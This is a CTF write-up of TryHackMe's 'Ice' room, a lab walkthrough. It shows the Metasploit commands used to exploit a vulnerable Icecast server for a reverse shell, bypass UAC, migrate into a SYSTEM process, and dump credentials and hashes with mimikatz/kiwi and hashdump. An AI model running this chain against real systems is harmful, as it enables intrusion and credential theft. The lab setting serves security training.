---
title: "Ice"
date: 2025-06-30
draft: false
summary: "Writeup for Ice CTF challenge on TryHackMe."
tags: ["windows", "rce", "hash crack"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/ice/cover.webp"
  caption: "Ice TryHackMe Challenge"
  alt: "Ice cover"
platform: "TryHackMe"
---

Deploy & hack into a Windows machine, exploiting a very poorly secured media server.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/ice

## Reconnaissance

I performed an **nmap** aggressive scan on the target to identify open ports and the services running on them.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN ice.nmap
```

| **PORT**    | **SERVICE** |
| ----------- | ----------- |
| 135         | rpc         |
| 139         | netbios     |
| 445         | smb         |
| 3389        | rdp         |
| 5357        | winrm       |
| 8000        | http        |
| 49152-49159 | rpc         |
| 49166       | rpc         |

![](https://cdn.ziomsec.com/ice/1.webp)

![](https://cdn.ziomsec.com/ice/2.webp)

## Initial Foothold

The **nmap** scan revealed an interesting service running on port 8000 so I accessed it.

![](https://cdn.ziomsec.com/ice/3.webp)

The room had the following link for reference:
- https://www.cvedetails.com/cve/CVE-2004-1561/

![](https://cdn.ziomsec.com/ice/4.webp)

The **Icecast** service running on port 8000 was most likely vulnerable to code execution. **Metasploit** contained an exploit that could be used for this. So I started the **metasploit** framework and selected the appropriate exploit.

```shell
msfdb run
use exploit/windows/http/icecast_header
```

I configured the required options and ran the exploit to get a reverse meterpreter shell.

![](https://cdn.ziomsec.com/ice/5.webp)

## Privilege Escalation

I used the `local_exploit_suggester` post module to look for privilege escalation vectors.

```shell
use post/multi/recon/local_exploit_suggestor
set session 1
run
```

![](https://cdn.ziomsec.com/ice/6.webp)

I then used a privilege escalation module and ran it to escalate my privilege.

```shell
use exploit/windows/local/bypassuac_eventvwr
```

![](https://cdn.ziomsec.com/ice/7.webp)

I was still running as Dark user but had admin privileges.

![](https://cdn.ziomsec.com/ice/8.webp)

![](https://cdn.ziomsec.com/ice/9.webp)

I then listed running processes in the target and found **spoolsv** to be running as NT Authority.

```shell
ps
```

![](https://cdn.ziomsec.com/ice/10.webp)

I migrated to the process and got NT Authority access.

```shell
migrate 1392
```

![](https://cdn.ziomsec.com/ice/11.webp)

I then loaded **mimikatz** using the **kiwi** extension of **metasploit**.

```shell
load kiwi
creds_all
```

![](https://cdn.ziomsec.com/ice/12.webp)

I also dumped the Administrator hash using the **hashdump** command in meterpreter.

```shell
hashdump
```

![](https://cdn.ziomsec.com/ice/13.webp)

That's it from my end, until next time :)

---
